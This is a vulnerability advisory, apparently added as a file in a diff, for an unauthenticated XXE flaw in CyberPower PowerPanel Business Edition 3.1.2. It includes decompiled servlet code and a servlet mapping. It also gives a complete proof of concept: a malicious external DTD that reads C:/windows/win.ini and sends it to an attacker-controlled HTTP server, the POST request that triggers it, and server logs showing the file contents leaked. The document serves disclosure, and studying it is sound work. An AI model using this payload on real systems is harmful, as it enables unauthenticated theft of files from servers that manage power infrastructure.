@@ -1,0 +1,135 @@
+CyberPower Systems PowerPanel 3.1.2 XXE Out-Of-Band Data Retrieval
+
+
+Vendor: CyberPower Systems, Inc.
+Product web page: https://www.cyberpowersystems.com
+Affected version: 3.1.2 (37567) Business Edition
+
+Summary: The PowerPanel® Business Edition software from
+CyberPower provides IT professionals with the tools they
+need to easily monitor and manage their backup power.
+Available for compatible CyberPower UPS models, this
+software supports up to 250 clients, allowing users remote
+access (from any network PC with a web browser) to instantly
+access vital UPS battery conditions, load levels, and runtime
+information. Functionality includes application/OS shutdown,
+event logging, hibernation mode, internal reports and analysis,
+remote management, and more.
+
+Desc: PowerPanel suffers from an unauthenticated XML External
+Entity (XXE) vulnerability using the DTD parameter entities
+technique resulting in disclosure and retrieval of arbitrary
+data on the affected node via out-of-band (OOB) attack. The
+vulnerability is triggered when input passed to the xmlservice
+servlet using the ppbe.xml script is not sanitized while parsing the
+xml inquiry payload returned by the JAXB element translation.
+
+================================================================
+
+C:\Program Files (x86)\CyberPower PowerPanel Business Edition\
+\web\work\ROOT\webapp\WEB-INF\classes\com\cyberpowersystems\ppbe\webui\xmlservice\
+------------------------
+XmlServiceServlet.class:
+------------------------
+
+94:  private InquirePayload splitInquirePayload(InputStream paramInputStream)
+95:    throws RequestException
+96:  {
+97:    try
+98:    {
+99:      JAXBContext localJAXBContext = JAXBContext.newInstance("com.cyberpowersystems.ppbe.core.xml.inquiry");
+100:     Unmarshaller localUnmarshaller = localJAXBContext.createUnmarshaller();
+101:     JAXBElement localJAXBElement = (JAXBElement)localUnmarshaller.unmarshal(paramInputStream);
+102:     return (InquirePayload)localJAXBElement.getValue();
+103:   }
+104:   catch (JAXBException localJAXBException)
+105:   {
+106:     localJAXBException.printStackTrace();
+107:     throw new RequestException(Error.INQUIRE_PAYLOAD_CREATE_FAIL, "Translate input to JAXB object failed.");
+108:   }
+109: }
+
+---
+
+C:\Program Files (x86)\CyberPower PowerPanel Business Edition\web\work\ROOT\webapp\WEB-INF\
+--------
+web.xml:
+--------
+
+28: <servlet>
+29: <servlet-name>xmlService</servlet-name>
+30: <servlet-class>com.cyberpowersystems.ppbe.webui.xmlservice.XmlServiceServlet</servlet-class>
+31: <load-on-startup>3</load-on-startup>
+32: </servlet>
+..
+..
+60: <servlet-mapping>
+61: <servlet-name>xmlService</servlet-name>
+62: <url-pattern>/ppbe.xml</url-pattern>
+63: </servlet-mapping>
+
+================================================================
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 EN
+           Microsoft Windows 8
+           Microsoft Windows Server 2012
+           Linux (64bit)
+           MacOS X 10.6
+           Jetty(7.5.0.v20110901)
+           Java/1.8.0_91-b14
+           SimpleHTTP/0.6 Python/2.7.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5338
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5338.php
+
+
+22.06.2016
+
+--
+
+
+C:\data\xxe.xml:
+----------------
+
+<!ENTITY % payload SYSTEM "file:///C:/windows/win.ini">
+<!ENTITY % root "<!ENTITY &#37; oob SYSTEM 'http://192.168.1.16:8011/?%payload;'> ">
+
+
+Request:
+--------
+
+POST /client/ppbe.xml HTTP/1.1
+Host: localhost:3052
+Content-Length: 258
+User-Agent: XXETester/1.0
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE zsl [
+<!ENTITY % remote SYSTEM "http://192.168.1.16:8011/xxe.xml">
+%remote;
+%root;
+%oob;]>
+<ppbe>
+<target>
+<command>action.notification.recipient.present</command>
+</target>
+<inquire />
+</ppbe>
+
+
+
+Response:
+---------
+
+C:\data>python -m SimpleHTTPServer 8011
+Serving HTTP on 0.0.0.0 port 8011 ...
+lab07.home - - [03/Jul/2016 13:09:04] "GET /xxe.xml HTTP/1.1" 200 -
+lab07.home - - [03/Jul/2016 13:09:04] "GET /?%5BMail%5D%0ACMCDLLNAME32=mapi32.dll%0ACMC=1%0AMAPI=1%0AMAPIX=1%0AMAPIXVER=1.0.0.1%0AOLEMessaging=1%0A HTTP/1.1" 301 -
+lab07.home - - [03/Jul/2016 13:09:04] "GET /?%5BMail%5D%0ACMCDLLNAME32=mapi32.dll%0ACMC=1%0AMAPI=1%0AMAPIX=1%0AMAPIXVER=1.0.0.1%0AOLEMessaging=1%0A/ HTTP/1.1" 200 -
